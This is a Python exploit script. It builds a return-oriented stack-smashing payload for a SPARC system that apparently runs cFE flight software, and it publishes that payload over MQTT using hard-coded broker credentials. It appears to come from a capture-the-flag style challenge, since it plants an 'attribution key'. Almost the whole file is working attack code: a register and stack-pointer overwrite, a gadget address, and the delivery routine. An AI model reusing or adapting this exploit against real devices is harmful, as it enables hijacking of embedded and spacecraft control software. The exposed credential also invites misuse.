#!/usr/bin/env python3

import time, os, subprocess, binascii, struct, paho.mqtt.publish as publish

def generate_payload():
	EXPLOIT_FILE = "exploit"
	ATTRIBUTION_KEY = 0x41424344
	ATTRIBUTION_KEY_ADDR = 0x406d50c0
	target_total_len = 72

	payload = b""

	# header
	payload += b"AAAA"
	payload += struct.pack(">I", 0x01000000) 
	# Get the offset of main in the file
	offset = int(os.popen('objdump -x exploit | grep rodata').read().split()[5], base=16)

	# Dump bytes from the file
	f = open(EXPLOIT_FILE, 'rb')
	f.seek(offset)

	exploit_payload = b""
	data = f.read(4)
	while (data and data != b"\x00\x00\x00\x00"):
		exploit_payload += data
		data = f.read(4)

	print(f"Parsed exploit bytes at offset {hex(offset)} of size {len(exploit_payload)}")
	print(binascii.hexlify(exploit_payload))

	payload += exploit_payload

	# filler
	filler_len = target_total_len - len(payload) - 12
	if filler_len < 0:
		print("Error. payload is too long!")
		exit(1)
	print(f"filler length: {filler_len}")

	payload += struct.pack(">I", 0xDEADDEAD) # o0
	payload += struct.pack(">I", 0xABCDEF01) # o1
	payload += struct.pack(">I", 0x414b3248) # o2, address of function we want to call
	payload += struct.pack(">I", 0x40001be0-8) # o3, going to go into o7, CFE_ES_ExitApp or OS_TaskExit, this doesnt seem to ever change
	payload += struct.pack(">I", ATTRIBUTION_KEY) # o4, set this to be the attribution key
	payload += struct.pack(">I", ATTRIBUTION_KEY_ADDR) # o5, set this to be the attribution key addr

	# overwrite of sp, must be 4 or 8-byte aligned or you trap, even if you dont use it
	sp_overwrite = 0x406d3000
	payload += struct.pack(">I", sp_overwrite)

	# overwrite of first gadget, jumps to the sample code at the beginning of the buffer
	# Note 1: this is a hardcoded stack address, calculatd by offset from the incoming message pointer 0x406d5138, 0x68 (104) bytes into the buffer
	
	# This overwrites some frame in there, and when it returns twice, you get the register context

	# Note 2: the actual address offset by 8 due to sparc delay slots
	# Should be 0x406D50D0
	stack_entry_addr = 0x406d5138-0x68

	payload += struct.pack(">I", stack_entry_addr-8)
	#payload = len(payload)*b'A'
	print(f"Created payload data of size {len(payload)}: {binascii.hexlify(payload)}")	
	return payload


def send_mqtt(payload):

	# Publish the message on mqtt
	STATUS_TOPIC = "COMM/PAYLOAD/SLA"
	MQTT_IP = os.environ['MQTT_IP']
	publish.single(STATUS_TOPIC, hostname=MQTT_IP, port=1883, payload=payload, qos=2, auth={'username':'comm', 'password':'2B5458962584FE417B2803CF'})

'''
# This is a hacky solution to use the bash program to send it over mqtt
PAYLOAD_FILE = "/tmp/payload.bin"

f = open(PAYLOAD_FILE, "wb")
f.write(payload)
f.close()
print(f"Wrote to temp payload file {PAYLOAD_FILE}")

command = "mosquitto_pub -h localhost -p 1883 -t 'COMM/PAYLOAD/SLA' -u comm -P comm -f "+PAYLOAD_FILE+" -q 2"

print(f"Executing mosquitto send: {command}")

proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
(out, err) = proc.communicate()

print(f"Output of mosquitto_pub:")
print(out)
print(err)
'''

if __name__ == "__main__":
	# Send the message over mqtt
	payload = generate_payload()

	f = open("payload5.bin", "wb")
	f.write(payload)

	send_mqtt(payload)
